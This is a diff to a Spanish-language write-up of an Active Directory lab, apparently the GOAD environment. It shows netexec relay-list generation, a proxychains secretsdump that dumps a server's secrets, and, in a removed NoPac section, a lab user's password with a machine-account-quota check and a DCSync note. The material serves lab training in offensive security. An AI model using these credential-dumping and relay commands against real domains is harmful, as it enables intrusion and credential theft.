@@ -260,7 +260,7 @@ Tenemos la password del usuario `robb.stark`:
 
 Aqui tambien encontramos el usuario y el hash de `eddard.stark`, este no puede ser crackeado, pero puede ser abusado con ntlmrelayx:
 ```bash
-nxc smb 192.168.56.10-23 --gen-relay-list relay.txt
+nxc smb 192.168.46.10-23 --gen-relay-list relay.txt
 ```
 
 Verificamos que el archivo generado solo tiene 1 servidor, que es el que contiene el MSSQL:
@@ -288,21 +288,6 @@ proxychains4 -q secretsdump.py -no-pass 'NORTH'/'EDDARD.STARK'@'192.168.46.22'
 ```
 
 Y veremos que realizamos una secretsdump (dumpeamos todos los secretos del servidor) directamente en el SERVER01.
-
-
-
-### NoPac Exploit
-
-Podemos verificar que podamos agregar maquinas con el permiso del usuario `jon.snow`:
-```bash
-nxc ldap winterfell.north.sevenkingdoms.local -u jon.snow -p iknownothing -d north.sevenkingdoms.local -M maq
-
-```
-
-Verificando el usuario de `robb.stark` en Bloodhound, vemos que el usuario permite realizar el ataque de `DCSync`
-
-
-![[Pasted image 20250309232716.png]]
 
 
 ## ADCS - ESC1 
